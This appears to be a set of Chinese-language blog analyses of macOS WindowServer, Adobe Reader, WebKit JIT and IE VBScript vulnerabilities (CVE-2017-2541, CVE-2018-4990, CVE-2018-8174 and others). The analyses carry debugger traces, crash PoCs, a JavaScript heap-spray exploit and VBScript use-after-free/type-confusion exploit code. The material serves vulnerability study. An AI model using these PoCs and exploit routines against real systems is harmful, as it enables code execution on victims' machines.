size_get_1; // ST00_8 _QWORD *buffer; // r15 unsigned __int64 idx; // r13 total_length = a5; buffer_1 = a4; size_param = a3; v8 = get_window_group(a1); v9 = v8; if ( v8 ) { length = CFArrayGetCount(v8); // user control if ( length &gt; size_param ) length = size_param; *total_length = length; size_get_1 = length; buffer = malloc(8LL * length); // size control idx = 0LL; CFArrayGetValues(v9, 0LL, size_get_1, buffer); if ( *total_length ) { do { CFNumberGetValue(buffer[idx++], 3LL, buffer_1);// buffer 's size is controled by user, overflow buffer_1 here buffer_1 += 4LL; } while ( idx &lt; *total_length ); } free(buffer); } else { *total_length = 0; }} array的size是用户传递的，也就是说可以控制buffer的大小，在中间的循环中，在内存访问操作中因为size用户可控，可以导致buffer_1 溢出。 poc1234567891011121314151617181920CGWindowID r[2] = {0};//...mach_msg_return_t ret;msg_t message;mach_port_t replyPort = mig_get_reply_port();//go trigger the bug!memset(&amp;message, 0, sizeof(message));message.header.msgh_remote_port = getport;message.header.msgh_local_port = replyPort;message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE);message.header.msgh_size = 40;message.header.msgh_id = 0x7210 + 0xc8;message.NDR = NDR_record;message.wid = r[0];message.length = 0x2010; 12sudo lldb ./main r 难的是poc的构造，主要是传递过来的参数(array)的构造。 referencezer0con2018_singi","link":"/2019/06/19/CVE-2017-2541-XGetWindowMovementGroup-stackoverflow/"},{"title":"CVE-2017-2540 _XGetConnectionPSN info leak","text":"basic infouninitialized stack var –&gt; info leakmacOS 10.12.1 vuln_FindProcessRecByConnectionID 调用失败后，会用未初始化的栈变量做赋值操作，导致信息泄漏。 1234567891011121314151617181920212223242526272829303132NDR_record_t __usercall _XGetConnectionPSN@&lt;rax&gt;(__int64 a1@&lt;rax&gt;, _DWORD *a2@&lt;rdi&gt;, __int64 a3@&lt;rsi&gt;){ __int64 savedregs; // ST08_8 __int64 v4; // rax __int64 v5; // rdx __int64 v6; // rcx NDR_record_t result; // rax savedregs = a1; if ( *a2 &lt; 0 || a2[1] != 0x24 ) { *(_DWORD *)(a3 + 32) = -304; result = NDR_record; *(NDR_record_t *)(a3 + 24) = NDR_record; } else { v4 = FindProcessRecByConnectionID((unsigned int)a2[8]); if ( v4 ) { v6 = *(_QWORD *)(v4 + 4); v5 = *(_QWORD *)(v4 + 4) &gt;&gt; 32; } *(_DWORD *)(a3 + 0x24) = v6; *(_DWORD *)(a3 + 0x28) = v5; // uninitialized *(_DWORD *)(a3 + 0x20) = 0; result = NDR_record; *(NDR_record_t *)(a3 + 24) = NDR_record; *(_DWORD *)(a3 + 4) = 44; } return result;} poc123456789101112131415161718192021222324void leak_addr(){ mach_msg_return_t ret; leak_msg_t message; mach_port_t replyPort = mig_get_reply_port(); memset(&amp;message, 0, sizeof(message)); message.header.msgh_remote_port = getport; message.header.msgh_local_port = replyPort; message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE); message.header.msgh_size = 36; message.header.msgh_id = 0x7210 + 0xff; message.NDR = NDR_record; message.size = 0; message.leak_addr = 0x1337; //if trigger leak bug successfully, it will be change to stack value. ret = mach_msg(&amp;(message.header), MACH_SEND_MSG | MACH_RCV_MSG, 36, 0xffff, replyPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if(ret != MACH_MSG_SUCCESS) { NSLog(@&quot;mach_msg fail.\\n&quot;); mach_error(&quot;mach_msg:&quot; , ret); } stack_addr = 0x7fff00000000 | message.leak_addr;} 写poc的时候发现一个问题，使用之前和fontd交互的代码获取port，然后填充mach msg的remote port 无法触发漏洞，问了下brightiup得到了答案： 1你获取的这个port是这个mach服务的port，他这个代码里面通过funcptr获得的port是一个对象的port可以理解为一个上下文。其实那个funcptr应该是CGSCreateLayerContext函数。 我获取到的port是没有上下文的，所以无法触发漏洞路径。 重新看了完整利用后，发现这个offset对应的函数应该是 CGSGetConnectionPortById。 referencezer0con2018_singi","link":"/2019/06/19/CVE-2017-2540-XGetConnectionPSN-info-leak/"},{"title":"CVE-2018-12794 分析","text":"0x00 : 漏洞信息XFA 类型混淆导致OOB的漏洞。 0x01 : PoC利用脚本把XFA和JS从PDF里拆分出来 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;xdp:xdp xmlns:xdp='http://ns.adobe.com/xdp/'&gt; &lt;config xmlns:xfa='http://www.xfa.org/schema/xci/3.1/'&gt; &lt;present&gt; &lt;pdf&gt; &lt;interactive&gt; 1 &lt;/interactive&gt; &lt;scriptModel&gt; XFA &lt;/scriptModel&gt; &lt;encryption&gt; &lt;permissions&gt; &lt;/permissions&gt; &lt;/encryption&gt; &lt;/pdf&gt; &lt;/present&gt; &lt;acrobat&gt; &lt;acrobat7&gt; &lt;dynamicRender&gt; required &lt;/dynamicRender&gt; &lt;/acrobat7&gt; &lt;/acrobat&gt; &lt;/config&gt; &lt;template&gt; &lt;subform layout='tb' name='outerform'&gt; &lt;pageSet&gt; &lt;pageArea id='Page2' name='Page2'&gt; &lt;contentArea h='100mm' w='200mm' x='0.25in' y='0.25in'/&gt; &lt;medium long='297mm' short='210mm' stock='a4'/&gt; &lt;/pageArea&gt; &lt;/pageSet&gt; &lt;subform name=&quot;sub1&quot;&gt;&lt;/subform&gt; &lt;subform name=&quot;sub2&quot;&gt; &lt;calculate&gt; &lt;script contentType=&quot;application/x-javascript&quot;&gt; app.alert(&quot;crash...!&quot;); &lt;/script&gt; &lt;/calculate&gt; &lt;/subform&gt; &lt;/subform&gt; &lt;/template&gt; &lt;xfa:datasets xmlns:xfa='http://www.xfa.org/schema/xfa-data/1.0/'/&gt;&lt;/xdp:xdp&gt; js代码如下 12345o = xfa.resolveNode(&quot;xfa[0].template[0].outerform[0].sub1[0]&quot;); o2 = xfa.resolveNode(&quot;xfa[0].form[0].outerform[0].sub2[0]&quot;);o.nodes.append(o2); o2.presence = &quot;inactive&quot;;//will crash hereapp.alert(&quot;no crash!&quot;); PoC很好懂，就是把o2节点添加为o的子节点，然后访问o2的presence属性，并且赋值，就是访问一次这个属性。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758(c74.700): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=00000001 ebx=00000000 ecx=42f2eec0 edx=0013d164 esi=00000000 edi=42f2eec0eip=5c067d77 esp=0013cfd8 ebp=0013d034 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00210246AcroForm!PlugInMain+0x979d7:5c067d77 39b7d0010000 cmp dword ptr [edi+1D0h],esi ds:0023:42f2f090=????????0:000&gt; k10ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.0013d034 5c05dd14 AcroForm!PlugInMain+0x979d70013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d9740013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b70013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac0013d174 5c05d731 AcroForm!PlugInMain+0x8d7040013d1e8 6e4e90b2 AcroForm!PlugInMain+0x8d3910013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31620013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50013d1f4 76ff65a6 ntdll!EtwSetMark+0xe7430013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa0013d1fc 6b09ecfa kernel32!HeapFree+0x140013d204 5c32f87d MSVCR120!free+0x1a00000000 00000000 AcroForm!DllUnregisterServer+0x1893d40:000&gt; dd edi42f2eec0 5c78061c 00000002 42c64fe8 5c88d32842f2eed0 00000147 c0c0c0c0 c0c0c0d0 43884fe042f2eee0 43404e40 00000000 43832fb0 c0c0c0c242f2eef0 42f2eec0 2ff76fd8 00000000 0000000042f2ef00 2be4cf30 00000015 00000000 5c88f9b442f2ef10 5c88d328 43404e40 00000000 0000000042f2ef20 00000000 00000000 00000004 5c64095442f2ef30 00000000 5c640954 00000000 42e8afd00:000&gt; dd edi+1d042f2f090 ???????? ???????? ???????? ????????42f2f0a0 ???????? ???????? ???????? ????????42f2f0b0 ???????? ???????? ???????? ????????42f2f0c0 ???????? ???????? ???????? ????????42f2f0d0 ???????? ???????? ???????? ????????42f2f0e0 ???????? ???????? ???????? ????????42f2f0f0 ???????? ???????? ???????? ????????42f2f100 ???????? ???????? ???????? ????????0:000&gt; !heap -p -a edi address 42f2eec0 found in _DPH_HEAP_ROOT @ 1471000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 431b130c: 42f2eec0 140 - 42f2e000 2000 ? AcroForm!DllUnregisterServer+5da173 6e4e8e89 verifier!VerifierDisableFaultInjectionExclusionRange+0x00002f39 77065e26 ntdll!RtlpNtMakeTemporaryKey+0x000040e7 7702a376 ntdll!EtwSetMark+0x0000ea0f 76ff5ae0 ntdll!wcsnicmp+0x000001e4 6b09ed63 MSVCR120!malloc+0x00000033 5bfd70ed AcroForm!PlugInMain+0x00006d4d 5c009e2d AcroForm!PlugInMain+0x00039a8d 这是一个越界读。 0x02 : 分析首先根据callstack，定位一下漏洞点以及发生oob的对象是啥。 1234567891011121314150:000&gt; k10ChildEBP RetAddr0013d034 5c05dd14 XFAFormModelImpl__isActivityExcluded 0013d0d0 5c01cc57 AcroForm!PlugInMain+0x8d9740013d118 5c4dcc55 AcroForm!PlugInMain+0x4c8b70013d130 5c05daa4 AcroForm!DllUnregisterServer+0x3367ac0013d174 5c05d731 sub_208FD8D50013d1e8 6e4e90b2 sub_208FD3BA 0013d1ec 770665f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31620013d1f0 7702a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50013d1f4 76ff65a6 ntdll!EtwSetMark+0xe7430013d1f8 7556c3d4 ntdll!wcsnicmp+0xcaa0013d1fc 6b09ecfa kernel32!HeapFree+0x140013d204 5c32f87d MSVCR120!free+0x1a00000000 00000000 sub_20BCF7CC // free wrp 发生崩溃的函数是在XFAFormModelImpl__isActivityExcluded ，这是在操作xfa.form对象，但是却发生了越界。调试发现，此时访问的对象并不是xfa.form对象，而是一个大小为0x140的对象，看下这个对象的分配情况，可以确定这个对象的大小、类型信息。得到这段代码的方法是：首先heap命令得到当前对象的基本情况，找到分配的位置，一般来说c++对象分配是先走malloc之类的分配器（程序可能自己封装malloc）分配内存（对象大小），然后初始化虚表啥的，所以malloc调用往前找一个就找到了。 123456789; __unwind { // loc_20E3F4E2push 8mov eax, offset loc_20E3F4E2call __EH_prolog3mov edi, ecxpush 140h ; size_t 对象大小call jfCacheManager_allocmov edx, eaxpop ecx 交叉引用得到这个对象是一个xfa.template对象，以下是两个对象的情况： xfa.template 对象大小 0x140xfa.form 对象大小 0x270所以这是一个类型混淆漏洞，程序错误的把xfa.template对象当作xfa.form对象来读取数据，导致越界的发生，root cause是类型混淆。 0x03 : 引用using-type-confusion-to-get-code-execution-in-adobe-reader","link":"/2019/03/12/CVE-2018-12794-%E5%88%86%E6%9E%90/"},{"title":"CVE-2018-4990 analysis","text":"1jp2k的越界读，转换2-free的利用。 环境信息Win7 x86Adobe Acrobat Reader 2018.011.20036 PoC一张特殊构造过的JP2K图片 大小和内容都是经过构造的，这里先触发一下漏洞，分析漏洞成因。 漏洞分析打开pageheap后，windbg调试。 123456789101112131415161718192021222324250:000&gt; reax=00000000 ebx=00000000 ecx=6bf58598 edx=00000000 esi=00000000 edi=00000000eip=6bf2ba58 esp=00529b04 ebp=00529b20 iopl=0 nv up ei pl zr na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246verifier!VerifierStopMessage+0x1f8:6bf2ba58 cc int 30:000&gt; k10ChildEBP RetAddr WARNING: Stack unwind information not available. Following frames may be wrong.00529b20 6bf29ee0 verifier!VerifierStopMessage+0x1f800529b84 6bf26f11 verifier!VerifierDisableFaultInjectionExclusionRange+0x3f900052a16c 6bf26f95 verifier!VerifierDisableFaultInjectionExclusionRange+0xfc10052a190 6bf27240 verifier!VerifierDisableFaultInjectionExclusionRange+0x10450052a1ac 6bf29080 verifier!VerifierDisableFaultInjectionExclusionRange+0x12f00052a1c8 776b65f4 verifier!VerifierDisableFaultInjectionExclusionRange+0x31300052a210 7767a0aa ntdll!RtlpNtMakeTemporaryKey+0x48b50052a304 776465a6 ntdll!EtwSetMark+0xe7430052a324 7733c3d4 ntdll!wcsnicmp+0xcaa0052a338 69feecfa kernel32!HeapFree+0x140052a34c 64290574 MSVCR120!free+0x1a0052a46c 642a6482 JP2KLib!JP2KCopyRect+0xbae60052a4c4 65f06a24 JP2KLib!JP2KImageInitDecoderEx+0x240052a54c 65f083be AcroRd32_65910000!AX_PDXlateToHostEx+0x2615e50052a5ac 65efd459 AcroRd32_65910000!AX_PDXlateToHostEx+0x262f7f0052a5b8 65f06368 AcroRd32_65910000!AX_PDXlateToHostEx+0x25801a 根据call stack往前找，找漏洞触发的点，着重分析JP2KLib中两个调用。 1234int __cdecl JP2KImageInitDecoderEx(Concurrency::details::SchedulerBase *a1, int a2, int a3, int a4, int a5){ return sub_1004F3BD(a2, a3, a4, a5);} 对应的汇编 调试一下这里： 可以发现，这个循环，每次读取8字节，循环次数0xff次。 123for(int idx = 0; idx &lt; 0xff; idx++){ //do read work...} 最后一次循环的时候，idx是0xfe，此时读取到 0xfe * 4。调试发现， 这个buffer size只有0xfd * 4 = 0x3f4这么大，所以导致越界读的发生。 Exploit 分析这个利用可以说十分的巧妙，利用js布局内存，把越界读转换成了Double free完成利用。 完整Exploit链接 因为需要提前做内存布局，不能直接就触发漏洞，所以需要利用js再布局内存完成后，主动地触发漏洞，这里的做法和p2o 2017，360安全团队打Reader的利用套路一样，把图片放嵌入button field,并设置按钮不可显示，在布局完成后，设置按钮属性可显，然后触发漏洞。 1234567891011121314151617181920212223242526var a = new Array(0x3000);var spraynum = 0x1000;var sprayarr = new Array(spraynum);var spraylen = 0x10000-24;var spraybase = 0x0d0e0048;var spraypos = 0x0d0f0058;// force allocations to prepare the heap for the oob readfor(var i1 = 1; i1 &lt; 0x3000; i1++){ a[i1] = new Uint32Array(252); // these will be freed a[i1][249] = spraybase; a[i1][250] = spraybase + 0x10000;}// heap spray to land ArrayBuffers at 0x0d0e0048 and 0x0d0f0048for(var i1 = 1; i1 &lt; spraynum; i1++){ sprayarr[i1] = new ArrayBuffer(spraylen);}// make holes so the oob read chunk lands herefor(var i1 = 1; i1 &lt; 0x3000; i1 = i1 + 2){ delete a[i1]; a[i1] = null;} 内存布局的话，利用中使用了ArrayBuffer，利用堆喷，分配大量连续的Arraybuffer，并make hole，使得图片解析的时候正好分配到内存布局的hole;随后触发越界读，把漏洞转换成double free去利用。 ​ 利用的后面通过sprayarr2的赋值抢占释放的0x20000内存，一旦抢占成功，sprayarr中之前被释放的elment的长度就会被修改为0x20000；最后通过之前内存布局后精准的内存释放(idx 249,250)获取一个超长element，以实现全局内存读写，再通过全局内存读写，伪造bookmarkRoot的对象实现任意代码执行。 遇到的问题(TODO)win7上这些分析没啥问题，一步步调试，内存布局也没什么问题；在win10上内存布局出现了不连续、失效等情况，这部分TODO，需要解决。 参考adobe-me-and-a-double-free 对CVE-2018-4990漏洞的补充分析 CVE-2018-4990 Adobe Reader 代码执行漏洞利用分析","link":"/2019/04/06/CVE-2018-4990-analysis/"},{"title":"CVE-2017-2547 分析","text":"CVE-2017-2547 分析 jit bug 缺少边界检查导致的越界读. 0x00 : PoCloki的poc 12345678910function f() { let arr = new Uint32Array(10); for (let i = 0; i &lt; 0x100000; i++) { parseInt(); } arr[8] = 1; arr[-0x12345678] = 2;}f(); Tencent Team Sniper的poc 3.5448480588962e-310 就是 0x414141414140 0x01 : 前置知识DFG JIT : 1DFG JIT 的使用前提是函数至少呗调用60次，或者循环执行至少1000次，或者2者同权值组合。 0x02 : 分析问题发生在DFG JIT中，访问数组的时候因为缺少必要的边界检查，导致越界访问，当然这个洞可以转化成读/写内存，然后导致rce。 直接看代码：git show f2476d46820b744450133f6b00a85e5265db1915 1234567891011121314151617 RangeKind m_kind;@@ -249,7 +258,13 @@ private: Node* maxNode; if (!data.m_key.m_source) {- minNode = 0;+ // data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()).+ // Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the+ // maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check.+ // We'll force an OSR exit in that case.+ minNode = nullptr;+ if (range.m_minBound &lt; 0)+ m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin); maxNode = m_insertionSet.insertConstant( nodeIndex, maxOrigin, jsNumber(range.m_maxBound)); } else {(END) 这里看到的逻辑太少，直接去源码里找： 1234567891011121314151617181920212223case ArrayBounds: { Node* minNode; Node* maxNode; if (!data.m_key.m_source) { // data.m_key.m_source being null means that we're comparing against int32 constants (see rangeKeyAndAddend()). // Since CheckInBounds does an unsigned comparison, if the minBound &gt;= 0, it is also covered by the // maxBound comparison. However, if minBound &lt; 0, then CheckInBounds should always fail its speculation check. // We'll force an OSR exit in that case. minNode = nullptr; if (range.m_minBound &lt; 0) m_insertionSet.insertNode(nodeIndex, SpecNone, ForceOSRExit, node-&gt;origin); maxNode = m_insertionSet.insertConstant( nodeIndex, maxOrigin, jsNumber(range.m_maxBound)); } else { minNode = insertAdd( nodeIndex, minOrigin, data.m_key.m_source, range.m_minBound, Arith::Unchecked); maxNode = insertAdd( nodeIndex, maxOrigin, data.m_key.m_source, range.m_maxBound, Arith::Unchecked); } .... 这里是为了确定要访问的数组的边界，每次访问确定最大和最小值，为了后面消除冗余节点。（比如，多次访问这个array的时候，访问了10，又访问了20，那么代码做检查的时候肯定只会检测是不是大于20，而不会再检查是否大于10）。在未patch的时候，边界检查的时Array的最小值是否是负数是没有做检测的，按照原来的逻辑： 如果如果min给个负数，那么后面的边界检查只有对max值的检查，也就是说这里可以给一个负的下标，从而造成越界访问。 那么PoC就很容易看懂了， 让js代码多次执行，make hot进入DFG JIT的优化流程，在访问数组时数组下标给一个负数，由于没有做边界检查，所以会导致越界读。 0x03 : Patch Patch代码的话，也很简单，增加了min是否是负数的检测，是的话就退出DFG优化，回退到更低一层的优化，去做更多的检查 ：） 0x04 : ReferenceDECONSTRUCTING A WINNING WEBKIT PWN2OWN ENTRY source code JavascriptCore四层结构 js-vuln-db","link":"/2019/04/20/CVE-2017-2547-%E5%88%86%E6%9E%90/"},{"title":"CVE-2019-7125 PoC","text":"InfoFrom Talos :Adobe Acrobat Reader DC text field value remote code execution vulnerability — redux PoC1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859%PDF-1.51 0 obj&lt;&lt;/Kids [&lt;&lt; /Annots [&lt;&lt; /Subtype /Text /Rect[0 0 0 0] /Subj (Hello World!) &gt;&gt; &lt;&lt; /Subtype /Text /Rect[0 0 0 0] /Subj (Hello zzzWorld!) &gt;&gt;] /Parent 1 0 R /Contents[3 0 R] &gt;&gt;] /Resources&lt;&lt;&gt;&gt;&gt;&gt;%endobj3 0 obj&lt;&lt;&gt;&gt;streamBT/F1 105 Tf 0 400 Td(Adobe Reader)Tj ETendstreamendobjtrailer&lt;&lt;/Root &lt;&lt; /AcroForm &lt;&lt; /Fields [ &lt;&lt; /Rect[10 10 10 10] /Subtype/Widget /T(mytext) /V(this is a text) /FT/Tx &gt;&gt; ] &gt;&gt; /OpenAction &lt;&lt; /S /JavaScript /JS( var r = new RegExp(Array(32770).join(String.fromCharCode(24))); this.getField('mytext')['value'] = r; ) &gt;&gt; /Pages 1 0 R &gt;&gt;&gt;&gt; ReferenceTALOS-2019-0774","link":"/2019/04/12/CVE-2019-7125-PoC/"},{"title":"CVE-2018-8174 analysis","text":"CVE-2018-8174 Basic Info利用ole加载IE的0day完成利用。 win7 sp1 x86 vbscript version : 5.8.9600.17420 vuln ✅poc 12345678910111213141516171819202122232425262728293031323334353637&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;script language=&quot;vbscript&quot;&gt;Dim array_aDim array_b(1)Class Trigger Private Sub Class Terminate() Set array_b(0) = array_a(1) array_a(1) = 1 End SubEnd ClassSub UAF ReDim array_a(1) Set array_a(1) = New Trigger Erase array_aEnd SubSub TriggerVuln array_b(0) = 0End SubSub StartExploit UAF TriggerVulnEnd SubStartExploit&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 看起来是个UaF，结合poc来看： UAF函数里Redim了array_a，并且把它的值初始化为Trigger对象的一个实例，随后便删除了array_a对象 array_a被删除的时候触发了Trigger的析构函数，这里面把array_a(1)赋值给array_b(0)，此时array_b(0)指向Trigger对象 随后array_a(1)=1是为了平衡引用计数，好获得一个野指针 随后的TriggerVuln函数里array_b(0)访问了已经释放的Trigger对象，导致UaF。 这个过程和之前看到的一些vbs的洞很像，都是一个模式。 那么根据!heap -p -a eax的调用栈可以看到一个!VbsErase+0x00000050函数，这个应该是对应poc里的Erase array_a。 调用栈k10里看到的vbscript!AssignVar 应该对应array_b(0) = 0赋值语句。 Q:UaF的对象是？A:VBScriptClass Q:被释放对象的大小？A:0x30释放的时候，回调用这个对象的VBScriptClass::Release函数，在c++层vbs里的Trigger对象是VBScriptClass，释放的时候调用了Release函数，所以该对象的大小等信息，可以调这个函数。 释放前后 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657580:007&gt; dd esi01848fd0 6b60206c 00000002 0184cf78 07d29f8801848fe0 00000b64 00000000 00000000 08864efc01848ff0 00000001 0865efe4 00000000 0000000001849000 ???????? ???????? ???????? ????????01849010 ???????? ???????? ???????? ????????01849020 ???????? ???????? ???????? ????????01849030 ???????? ???????? ???????? ????????01849040 ???????? ???????? ???????? ????????0:007&gt; !heap -p -a esi address 01848fd0 found in _DPH_HEAP_ROOT @ 1781000 in busy allocation ( DPH_HEAP_BLOCK: UserAddr UserSize - VirtAddr VirtSize) 8860ea0: 1848fd0 30 - 1848000 2000 vbscript!VBScriptClass::`vftable' 722c8e89 verifier!AVrfDebugPageHeapAllocate+0x00000229 77225ede ntdll!RtlDebugAllocateHeap+0x00000030 771ea40a ntdll!RtlpAllocateHeap+0x000000c4 771b5ae0 ntdll!RtlAllocateHeap+0x0000023a 77039d45 msvcrt!malloc+0x0000008d 7703b0d7 msvcrt!operator new+0x0000001d 6b629f0c vbscript!VBScriptClass::Create+0x00000014 6b629e97 vbscript!CScriptRuntime::RunNoEH+0x00002c78 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b62a12e vbscript!CScriptRuntime::RunNoEH+0x00002c23 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6057cb vbscript!CScriptRuntime::RunNoEH+0x00001d74 6b60526e vbscript!CScriptRuntime::Run+0x000000c3 6b60518b vbscript!CScriptEntryPoint::Call+0x0000010b 6b6059bd vbscript!CSession::Execute+0x00000156 6b605c6b vbscript!COleScript::ExecutePendingScripts+0x0000014f 6b629138 vbscript!COleScript::ParseScriptTextCore+0x0000023e 6b60c3b9 vbscript!COleScript::ParseScriptText+0x00000029 6496f1e5 MSHTML!CActiveScriptHolder::ParseScriptText+0x00000051 64a05f3a MSHTML!CScriptCollection::ParseScriptText+0x00000177 6496fd65 MSHTML!CScriptData::CommitCode+0x00000332 6496f973 MSHTML!CScriptData::Execute+0x00000286 649707d4 MSHTML!CHtmScriptParseCtx::Execute+0x00000130 649e9a52 MSHTML!CHtmParseBase::Execute+0x00000196 6476b333 MSHTML!CHtmPost::Broadcast+0x00000153 6476b0ef MSHTML!CHtmPost::Exec+0x000005d9 64a078c8 MSHTML!CHtmPost::Run+0x0000003d 0:007&gt; g(b4c.b64): Access violation - code c0000005 (first chance)First chance exceptions are reported before any exception handling.This exception may be expected and handled.eax=01848fd0 ebx=72540fd0 ecx=00000009 edx=00000009 esi=08658fe0 edi=00000009eip=759e4971 esp=0479b7f0 ebp=0479b7f8 iopl=0 nv up ei pl nz na po nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010202OLEAUT32!VariantClear+0xb3:759e4971 8b08 mov ecx,dword ptr [eax] ds:0023:01848fd0=???????? exploit analysis利用，找合适的对象占位，可以使用另一个VBScriptClass对象来占位，构造类型混淆去利用。 这个对象的结构: 123401848fd0 6b60206c 00000002 0184cf78 07d29f88 vtable refcnt NameTbl01848fe0 00000b64 00000000 00000000 08864efc01848ff0 00000001 0865efe4 00000000 00000000 NameTbl对象保存的是这个对象的 成员变量和方法，这个对象可以被用来做利用，重点关注。 这个对象大小 0x88，NameTbl对象从+0×48开始保存成员变量和成员函数的指针 123456789101112131415161718192021NameList *__thiscall NameList::NameList(int this){ NameList *result; // eax *(_DWORD *)(this + 12) = 256; *(_DWORD *)this = 0; *(_DWORD *)(this + 4) = 0; *(_DWORD *)(this + 8) = 0; *(_DWORD *)(this + 16) = 0x4000; *(_DWORD *)(this + 52) = this + 56; *(_DWORD *)(this + 44) = 0; *(_DWORD *)(this + 48) = 20; *(_DWORD *)(this + 20) = 0; *(_DWORD *)(this + 24) = this + 20; result = (NameList *)this; *(_DWORD *)(this + 32) = 15; *(_DWORD *)(this + 28) = 0; *(_DWORD *)(this + 36) = 0; *(_DWORD *)(this + 40) = 64; return result;} UAF函数 ✅两次0-6的循环之后，UafArrayA 和 UafArrayB里面的7个元素都指向了释放的 ClassTerminateA/B对象。。随后立即用 ReuseClass对象占位，此时7个引用都指向这个新的ReuseClass。。。 ClassTerminateA释放的时候: 1234567890:007&gt; dd 06776fd0 06776fd0 69a8206c 00000000 067cff78 07ebdf8806776fe0 000009c4 00000000 00000000 067d3efc06776ff0 00000000 07384fc4 00000000 067b0fd006777000 ???????? ???????? ???????? ????????06777010 ???????? ???????? ???????? ????????06777020 ???????? ???????? ???????? ????????06777030 ???????? ???????? ???????? ????????06777040 ???????? ???????? ???????? ???????? 调试发现并没有占位成功，需要调整exp的占位部分。 应该是有碎片，所以ClassTerminateA创建又释放的时候没有用同一块内存… 后面发现是pageheap的问题，不能开pageheap。 TypeConfusion函数 ✅resueObjectA_arr和resueObjectA_int setProp给成员mem赋值。。赋值成ReplacingClass_Array和ReplacingClass_Int 自动触发了getter回调。。。 两个Getter回调里做的事差不多， 1234567891011121314Class ReplacingClass_ArrayPublic Default Property Get Q Dim objectImitatingArray Q=CDbl(&quot;174088534690791e-324&quot;) ' db 0, 0, 0, 0, 0Ch, 20h, 0, 0 For idx=0 To 6 UafArrayA(idx)=0 Next Set objectImitatingArray=New FakeReuseClass objectImitatingArray.mem = FakeArrayString For idx=0 To 6 Set UafArrayA(idx)=objectImitatingArray NextEnd PropertyEnd Class ReuseClass.mem 赋值为 CDbl(&quot;174088534690791e-324&quot;) 随后释放了原本UafArrayA指向的内存，随后利用Set objectImitatingArray=New FakeReuseClass去占位，重新获取到原本对象的内存，此时就可以把 ReuseClass混淆成了FakeReuseClass对象。之后 objectImitatingArray.mem 的赋值利用错位覆盖，伪造出了一个Array对象。 重点调试下这个混淆的过程： 两个地址分别是1e7c720和1e82fa8 12345678910110:002&gt; dd 1e7c758 L401e7c758 6b7e206c 00000007 01e7da70 01e79ef80:002&gt; dd 01e7da70 + 0x34 L401e7daa4 01e7daa8 01e81984 01e819b8 01e819f80:002&gt; du 01e81984 +3001e819b4 &quot;p&quot;0:002&gt; du 01e819b8 +3001e819e8 &quot;SetProp&quot;0:002&gt; du 01e819f8+3001e81a28 &quot;mem&quot; 类型混淆前 120:005&gt; dd 01e819f8 L401e819f8 00000000 00500053 00000050 00000000 混淆之后 120:005&gt; dd 01e819f8 L401e819f8 00000005 00000000 00000000 0000200c 借用别人分析里的一个图 这里的写是 在类型混淆的基础上，错位修改了成员类型。 (将VARIANT类型从String覆盖为Array) 获得了一个 0x7fffffff 长的array用于读写内存。 AAR/AAW ✅伪造的两个对象(+8)处的NameList对象是连续分配的 1234567// 第一个0:018&gt; dd 01bce438 L401bce438 01bd2348 000000ac 00000100 00000100// 第二个0:018&gt; dd 01bce558 L401bce558 01bd2578 000000ac 00000100 00000100 成员也是连续分配的， 12340:018&gt; dd 01bce438 +0x34 L401bce46c 01bce470 01bd234c 01bd2380 01bd23c00:018&gt; dd 01bce558 +0x34 L401bce58c 01bce590 01bd257c 01bd25b0 01bd25f0 所以可以利用这个特性，第一个对象为造成了一个0x7fffffff长度的array， 伪造的int对象的mem成员在fakearray的范围里，所以int.mem是一个fakearray里的地址，指向特定的元素，那么只要使用fakearray[int.mem]就可以任意地址读写。 下面是手写的记录 RCE ✅写ROP+shellcode到可控的数组中，触发执行，rop修改内存属性并跳到shellcode去执行。 12345Sub TriggerCodeExecution resueObjectA_arr.mem(some_memory)=&amp;h4d Wscript.Echo(&quot;GO&quot;) resueObjectA_arr.mem(some_memory+8)=0End Sub 触发的时候，把这个元素的VARIANT类型修改为0x4d，随后memClassA.mem(address + 8) = 0触发了AssignVar函数。 代码流将按相应大小跳转到一个“函数指针数组”的结构。当类型为0x4d，将VARIANT中的值域压栈保存，并将该值域解析成vfTable，随后发生调用，可以成功劫持eip。 1234NTSYSAPI NTSTATUS NTAPI ZwContinue ( IN PCONTEXT Context; IN BOOLEAN TestAlert); 